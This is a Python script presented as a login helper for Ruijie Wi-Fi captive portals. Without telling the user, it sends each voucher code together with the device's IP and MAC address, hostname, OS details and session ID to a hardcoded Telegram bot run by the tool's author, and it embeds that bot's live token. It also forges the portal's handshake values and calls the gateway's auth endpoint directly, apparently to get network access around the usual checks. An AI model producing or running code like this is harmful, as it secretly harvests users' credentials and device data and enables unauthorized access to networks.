import os
import asyncio
import re
import base64
import time
import hashlib
import random
import requests
import aiohttp
import uuid
import json
import platform
import socket
import sys
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin, quote

# --- Advanced Color Palette ---
C_CYAN    = "\033[1;36m"
C_GREEN   = "\033[1;32m"
C_RED     = "\033[1;31m"
C_YELLOW  = "\033[1;33m"
C_BLUE    = "\033[1;34m"
C_MAGENTA = "\033[1;35m"
C_WHITE   = "\033[0;37m"
C_RESET   = "\033[0m"

# --- Status Indicators ---
INFO  = f"{C_BLUE}[*]{C_RESET}"
SUCC  = f"{C_GREEN}[+]{C_RESET}"
WARN  = f"{C_YELLOW}[!]{C_RESET}"
FAIL  = f"{C_RED}[-]{C_RESET}"

# Global Configuration
SUCCESS_COUNT = 0
TIMEOUT_SEC = 10

# Telegram Configuration
TG_BOT_TOKEN = "8788771663:AAFmIVvFUHTfbJEMvBXGd22Is7TqzX4JfT4"
TG_CHAT_ID = "8404894106"

# =====================================================================
# 👥 USER & ACCESS CONTROL DATABASE
# =====================================================================
USER_DATABASE = {
    "STR-D95E6284": "Ko Min Min",
    "STR-A1B2C3D4": "Ma Su Su", 
    "STR-E5F6G7H8": "Ko Naing Aung",
}

BLACKLIST = [
    "STR-BLOCK123",
    "STR-XYZ99999",
]

# =====================================================================
# 📊 LOG & STATISTICS FILES
# =====================================================================
VOUCHER_LOG_FILE = "voucher_usage.log"
ATTEMPT_COUNT_FILE = "attempt_counts.json"
STATS_FILE = "admin_stats.json"
RATE_LIMIT = {}

# =====================================================================
# 🔧 UTILITY FUNCTIONS
# =====================================================================

def log_voucher_usage(user_id, user_name, voucher, status, remaining_time="Unknown", ip="N/A", mac="N/A"):
    """Log voucher usage to file for admin reference"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] USER: {user_name} ({user_id}) | VOUCHER: {voucher} | STATUS: {status} | TIME: {remaining_time} | IP: {ip} | MAC: {mac}\n"
    try:
        with open(VOUCHER_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except:
        pass

def update_attempt_count(user_id):
    """Track how many times a user has attempted"""
    try:
        if os.path.exists(ATTEMPT_COUNT_FILE):
            with open(ATTEMPT_COUNT_FILE, "r") as f:
                data = json.load(f)
        else:
            data = {}
        
        data[user_id] = data.get(user_id, 0) + 1
        
        with open(ATTEMPT_COUNT_FILE, "w") as f:
            json.dump(data, f, indent=2)
        
        return data[user_id]
    except:
        return 0

def get_attempt_count(user_id):
    """Get user's total attempt count"""
    try:
        if os.path.exists(ATTEMPT_COUNT_FILE):
            with open(ATTEMPT_COUNT_FILE, "r") as f:
                data = json.load(f)
            return data.get(user_id, 0)
        return 0
    except:
        return 0

def get_system_info():
    """Get system information"""
    try:
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        hostname = socket.gethostname()
        processor = platform.processor() or "Unknown"
        return {
            "system": system,
            "release": release,
            "machine": machine,
            "hostname": hostname,
            "processor": processor
        }
    except:
        return {
            "system": "Unknown",
            "release": "Unknown",
            "machine": "Unknown",
            "hostname": "Unknown",
            "processor": "Unknown"
        }

def check_rate_limit(user_id):
    """Prevent spam - 5 seconds cooldown"""
    now = time.time()
    if user_id in RATE_LIMIT:
        if now - RATE_LIMIT[user_id] < 5:
            return False
    RATE_LIMIT[user_id] = now
    return True

def validate_voucher(voucher):
    """Validate voucher format"""
    return bool(re.match(r'^[A-Za-z0-9]{6,12}$', voucher))

def get_device_id():
    """Get a stable device ID that never changes"""
    device_id_file = ".device_id"
    
    # Try to read existing device ID from file
    try:
        if os.path.exists(device_id_file):
            with open(device_id_file, "r") as f:
                device_id = f.read().strip()
                if device_id and device_id.startswith("STR-"):
                    return device_id
    except:
        pass
    
    # Generate a new stable device ID
    try:
        identifiers = []
        
        # Method 1: MAC address via uuid.getnode()
        node_id = str(uuid.getnode())
        if node_id and node_id not in ["0", "1", "4294967295"]:
            identifiers.append(node_id)
        
        # Method 2: Hostname
        try:
            hostname = socket.gethostname()
            if hostname:
                identifiers.append(hostname)
        except:
            pass
        
        # Method 3: Machine info
        try:
            machine = platform.machine()
            if machine:
                identifiers.append(machine)
        except:
            pass
        
        # Method 4: System platform
        if sys.platform:
            identifiers.append(sys.platform)
        
        # Method 5: CPU info (Linux only)
        try:
            if sys.platform.startswith('linux'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpu_info = f.read()
                    for line in cpu_info.split('\n'):
                        if 'Serial' in line or 'system' in line.lower():
                            identifiers.append(line.strip())
                            break
        except:
            pass
        
        # Create a unique hash from all identifiers
        combined = "|".join(identifiers) if identifiers else str(time.time())
        hash_object = hashlib.sha256(combined.encode())
        hex_dig = hash_object.hexdigest()
        device_id = f"STR-{hex_dig[:8].upper()}"
        
        # Save for future use
        try:
            with open(device_id_file, "w") as f:
                f.write(device_id)
        except:
            pass
        
        return device_id
        
    except Exception:
        fallback_id = f"STR-{random.randint(100000, 999999)}"
        try:
            with open(device_id_file, "w") as f:
                f.write(fallback_id)
        except:
            pass
        return fallback_id

def get_user_name(user_id):
    """Get user name from database, if not found generate a consistent name"""
    if user_id in USER_DATABASE:
        return USER_DATABASE[user_id]
    
    try:
        hash_obj = hashlib.md5(user_id.encode())
        hash_hex = hash_obj.hexdigest()
        name_suffix = hash_hex[:6].upper()
        
        name_patterns = [
            f"User_{name_suffix}",
            f"Guest_{name_suffix}",
            f"Member_{name_suffix}",
            f"Visitor_{name_suffix}",
        ]
        
        pattern_index = int(hash_hex[0], 16) % len(name_patterns)
        generated_name = name_patterns[pattern_index]
        
        USER_DATABASE[user_id] = generated_name
        return generated_name
    except:
        return f"User_{user_id[-6:]}"

def show_banner(user_id, user_name):
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    print(f"{C_CYAN}🤖" + "═" * 58 + "🤖")
    print(rf"""{C_MAGENTA}  __  __ _____       _  ____  _    _ _   _ 
 |  \/  |  __ \     | |/ __ \| |  | | \ | |
 | \  / | |__) |    | | |  | | |__| |  \| |
 | |\/| |  _  / _   | | |  | |  __  | . ` |
 | |  | | | \ \| |__| | |__| | |  | | |\  |
 |_|  |_|_|  \_\\____/ \____/|_|  |_|_| \_|""")
    print(f"{C_CYAN}─" * 60)
    print(rf"""{C_YELLOW}  ______ _      ____  _   _ __  __ _    _  _____ _  __
 |  ____| |    / __ \| \ | |  \/  | |  | |/ ____| |/ /
 | |__  | |   | |  | |  \| | \  / | |  | | (___ | ' / 
 |  __| | |   | |  | | . ` | |\/| | |  | |\___ \|  <  
 | |____| |___| |__| | |\  | |  | | |__| |____) | . \ 
 |______|______\____/|_| \_|_|  |_|\____/|_____/|_|\_\ """)
    print(f"{C_CYAN}─" * 60)
    print(f"{C_WHITE}  ⚡ SYSTEM  : {C_MAGENTA}ALL RUIJIE ELONMUSK CODE")
    print(f"{C_WHITE}  🌐 CHANNEL : {C_GREEN}https://t.me/npvvpnoldversion")
    print(f"{C_WHITE}  👑 OWNER   : {C_YELLOW}@Elonmusk20606")
    print(f"{C_WHITE}  👤 USER    : {C_GREEN}{user_name}{C_RESET}")
    print(f"{C_WHITE}  🆔 USER ID : {C_CYAN}{user_id}{C_RESET}")
    print(f"{C_CYAN}🤖" + "═" * 58 + "🤖" + f"{C_RESET}\n")

async def send_telegram_notification(session, message):
    """Send detailed notification to Telegram with all voucher info"""
    if TG_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TG_CHAT_ID == "YOUR_CHAT_ID_HERE":
        return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        async with session.post(url, json=payload, timeout=5) as resp:
            pass
    except:
        pass

class RuijieLoginManager:
    def __init__(self, user_id, user_name):
        self.ip = None
        self.mac = None
        self.current_sid = None
        self.user_id = user_id
        self.user_name = user_name
        self.load_saved_ip()
        self.load_saved_mac()
        self.phone_number = "12345678901"
        self.remaining_time = "Unknown"
        self.current_voucher = None
        self.attempt_count = get_attempt_count(user_id) + 1
        self.system_info = get_system_info()

    def load_saved_ip(self):
        if os.path.exists(".ip"):
            try:
                with open(".ip", "r") as f: self.ip = f.read().strip()
            except: self.ip = None

    def load_saved_mac(self):
        if os.path.exists(".mac"):
            try:
                with open(".mac", "r") as f: self.mac = f.read().strip()
            except: self.mac = None

    async def auto_detect_gateway(self, session):
        print(f"{INFO} Initializing network environment detection...")
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile'}
        try:
            async with session.get(test_url, headers=headers, timeout=5, allow_redirects=False) as resp:
                if resp.status in (301, 302):
                    location = resp.headers.get('Location', '')
                    parsed_url = urlparse(location)
                    query_params = parse_qs(parsed_url.query)
                    gw_addr_list = query_params.get('gw_address') or query_params.get('ip')
                    if gw_addr_list:
                        self.ip = gw_addr_list[0]
                        with open(".ip", "w") as f: f.write(self.ip)
                        print(f"{SUCC} Gateway IP Resolved: {C_GREEN}{self.ip}{C_RESET}")
                    mac_list = query_params.get('mac') or query_params.get('umac') or query_params.get('usermac')
                    if mac_list:
                        self.mac = mac_list[0]
                        with open(".mac", "w") as f: f.write(self.mac)
                        print(f"{SUCC} Physical MAC Resolved: {C_GREEN}{self.mac}{C_RESET}")
                    return True
                else:
                    if self.ip and self.mac:
                        print(f"{SUCC} Using cached parameters -> [IP: {self.ip} | MAC: {self.mac}]")
                        return True
        except:
            if self.ip and self.mac: return True
        return False

    async def _fetch_sid(self, session):
        current_ip = self.ip if self.ip else "192.168.110.38"
        current_gw = self.ip if self.ip else "192.168.110.1"
        current_mac = self.mac if self.mac else "98:ee:94:d3:e8:12"
        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        params = {
            "stage": "portal", "gw_id": "4c49684b38d4", "gw_sn": "H1U82VB011097",
            "gw_address": current_gw, "gw_port": "2060", "ip": current_ip, "mac": current_mac,
            "slot_num": "16", "nasip": "192.168.1.104", "ssid": "VLAN233", "ustate": "0",
            "mac_req": "1", "url": "http://192.168.0.1/", "chap_id": r"\272",
            "chap_challenge": r"\135\334\201\065\203\146\062\205\142\344\227\245\301\043\054\146"
        }
        step1_url = f"{base_url}?{ '&'.join([f'{k}={quote(str(v))}' for k, v in params.items()]) }"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        }
        try:
            print(f"{INFO} Establishing handshakes with endpoint proxy...")
            async with session.get(step1_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r1:
                location = r1.headers.get('Location', '')
                if not location and r1.status == 200:
                    body = await r1.text()
                    js_match = re.search(r"self\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                    if js_match: location = js_match.group(1)
                if not location: location = step1_url
                step2_url = urljoin("https://portal-as.ruijienetworks.com", location)
            async with session.get(step2_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r2:
                target_url = r2.headers.get('Location', step2_url)
                parsed_url = urlparse(target_url)
                query_params = parse_qs(parsed_url.query)
                sid_list = query_params.get('sessionId')
                if sid_list:
                    self.current_sid = sid_list[0]
                    return self.current_sid
                elif 'sessionId=' in target_url:
                    self.current_sid = target_url.split('sessionId=')[1].split('&')[0]
                    return self.current_sid
        except Exception as e:
            print(f"{FAIL} Handshake issue: {e}")
        return None

    async def send_detailed_notification(self, session, status, voucher="", remaining_time="Unknown"):
        """Send detailed Telegram notification with all info"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Status emoji mapping
        emoji_map = {
            "ATTEMPT": "⏳",
            "SUCCESS": "✅",
            "FAILED": "❌",
            "ERROR": "⚠️",
            "COMPLETE": "🚀"
        }
        emoji = emoji_map.get(status, "📌")
        
        # Build message
        msg = (
            f"{emoji} *[VOUCHER {status}]*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *User:* `{self.user_name}`\n"
            f"🆔 *User ID:* `{self.user_id}`\n"
            f"🔑 *Voucher:* `{voucher}`\n"
            f"⏳ *Time Left:* `{remaining_time}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 *IP Address:* `{self.ip or 'N/A'}`\n"
            f"🔗 *MAC Address:* `{self.mac or 'N/A'}`\n"
            f"💻 *Device:* `{self.system_info['system']} {self.system_info['release']}`\n"
            f"🖥️ *Arch:* `{self.system_info['machine']}`\n"
            f"📱 *Hostname:* `{self.system_info['hostname']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 *Session:* `{self.current_sid[:12] if self.current_sid else 'N/A'}...`\n"
            f"📊 *Attempt #:* `{self.attempt_count}`\n"
            f"🕐 *Time:* `{timestamp}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        )
        
        # Add warning if time is running low
        if remaining_time != "Unknown" and remaining_time != "N/A":
            try:
                if ":" in remaining_time:
                    parts = remaining_time.split(":")
                    if len(parts) >= 2:
                        minutes = int(parts[0]) * 60 + int(parts[1])
                        if minutes < 300:  # Less than 5 minutes
                            msg += f"⚠️ *WARNING: Only {remaining_time} remaining!*\n"
            except:
                pass
        
        await send_telegram_notification(session, msg)

    async def login_voucher(self, session, voucher, debug=False):
        global SUCCESS_COUNT
        
        # Check rate limit
        if not check_rate_limit(self.user_id):
            print(f"{WARN} Rate limit exceeded! Please wait 5 seconds.")
            return False
        
        # Validate voucher format
        if not validate_voucher(voucher):
            print(f"{FAIL} Invalid voucher format! Must be 6-12 alphanumeric characters.")
            return False
        
        self.current_voucher = voucher
        self.attempt_count = update_attempt_count(self.user_id)
        
        # Send attempt notification
        await self.send_detailed_notification(session, "ATTEMPT", voucher=voucher)
        log_voucher_usage(
            self.user_id, self.user_name, voucher, "ATTEMPTING",
            ip=self.ip or "N/A", mac=self.mac or "N/A"
        )
        
        if not self.current_sid:
            self.current_sid = await self._fetch_sid(session)
        if not self.current_sid:
            print(f"{FAIL} Authentication aborted. No active token sequence.")
            await self.send_detailed_notification(session, "FAILED", voucher=voucher)
            log_voucher_usage(
                self.user_id, self.user_name, voucher, "FAILED - No Session",
                ip=self.ip or "N/A", mac=self.mac or "N/A"
            )
            return False

        data = {"accessCode": voucher, "sessionId": self.current_sid, "apiVersion": 1}
        try: 
            post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode('utf-8')
        except: 
            post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/kunji5dg96teooiimnl&IS_EG=0&sessionId={self.current_sid}",
            "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        try:
            print(f"{INFO} Transmitting access keys to validation server...")
            async with session.post(post_url, json=data, headers=headers, timeout=TIMEOUT_SEC) as req:
                response_text = await req.text()
                try:
                    res_json = json.loads(response_text)
                    duration = res_json.get('duration') or res_json.get('remainingTime')
                    if duration:
                        self.remaining_time = str(timedelta(seconds=int(duration)))
                except:
                    pass

                if 'logonUrl' in response_text or req.status == 200:
                    SUCCESS_COUNT += 1
                    print(f'{SUCC} {C_GREEN}ACCESS GRANTED{C_RESET} -> Token Key: [{C_YELLOW}{voucher}{C_RESET}]')
                    
                    await self.send_detailed_notification(
                        session, "SUCCESS", 
                        voucher=voucher, 
                        remaining_time=self.remaining_time
                    )
                    log_voucher_usage(
                        self.user_id, self.user_name, voucher, "SUCCESS",
                        remaining_time=self.remaining_time,
                        ip=self.ip or "N/A", mac=self.mac or "N/A"
                    )
                    return True
                else:
                    await self.send_detailed_notification(session, "FAILED", voucher=voucher)
                    log_voucher_usage(
                        self.user_id, self.user_name, voucher, "FAILED - Invalid",
                        ip=self.ip or "N/A", mac=self.mac or "N/A"
                    )
                    return False 
        except Exception as Error:
            await self.send_detailed_notification(session, "ERROR", voucher=voucher)
            log_voucher_usage(
                self.user_id, self.user_name, voucher, f"ERROR - {str(Error)[:50]}",
                ip=self.ip or "N/A", mac=self.mac or "N/A"
            )
            return False

    async def send_request(self, session, log=True):
        if not self.current_sid: return False
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'}
        params = {'token': self.current_sid, 'phoneNumber': self.phone_number}
        try:
            current_gw = self.ip if self.ip else "192.168.110.1"
            auth_url = f'http://{current_gw}:2060/wifidog/auth'
            async with session.post(auth_url, params=params, headers=headers, timeout=TIMEOUT_SEC) as response:
                if response.status == 200:
                    try: os.system('clear' if os.name == 'posix' else 'cls')
                    except: pass
                    print(f"{C_GREEN}🎉 " + "═" * 56 + " 🎉")
                    print(rf"""{C_GREEN}   _____ _    _  _____ _____ ______  _____ _____ 
  / ____| |  | |/ ____/ ____|  ____|/ ____/ ____|
 | (___ | |  | | |   | |    | |__  | (___| (___  
  \___ \| |  | | |   | |    |  __|  \___ \\___ \ 
  ____) | |__| | |___| |____| |____ ____) |___) |
 |_____/ \____/ \_____\_____|______|_____/_____/ """)
                    print(f"{C_GREEN}═" * 60)
                    print(f" {SUCC} {C_YELLOW}Congratulations, {self.user_name}!{C_RESET}")
                    print(f" {SUCC} {C_GREEN}CONNECTION ESTABLISHED SUCCESSFULLY!{C_RESET}")
                    print(f" {SUCC} {C_CYAN}Remaining Time: {C_YELLOW}{self.remaining_time}{C_RESET}")
                    print(f" {SUCC} {C_CYAN}Enjoy high speed internet route now. ✨{C_RESET}")
                    print(f"{C_GREEN}═" * 60 + f"{C_RESET}")
                    
                    await self.send_detailed_notification(
                        session, "COMPLETE",
                        voucher=self.current_voucher,
                        remaining_time=self.remaining_time
                    )
                    return True
                return False
        except: return False

    async def run_auth_flow(self, session, voucher, debug=False):
        await self.auto_detect_gateway(session)
        login_success = await self.login_voucher(session, voucher, debug=debug)
        if login_success:
            await self.send_request(session, log=debug)

async def start_tool():
    user_id = get_device_id()
    user_name = get_user_name(user_id)
    if user_id in BLACKLIST:
        print(f"\n{C_RED} ACCESS DENIED: Your Device Has Been Blacklisted!{C_RESET}")
        return
    show_banner(user_id, user_name)
    user_voucher = input(f"{C_YELLOW}[?] Enter Access Token Key : {C_RESET}").strip()
    if not user_voucher: return
    manager = RuijieLoginManager(user_id, user_name)
    async with aiohttp.ClientSession() as session:
        await manager.run_auth_flow(session, voucher=user_voucher, debug=True)
    print(f"\n{C_CYAN}=" * 60 + f"{C_RESET}")
    input(f"{C_WHITE}[*] Process ended. Press Enter to release console session...{C_RESET}")

if __name__ == "__main__":
    try: asyncio.run(start_tool())
    except KeyboardInterrupt: pass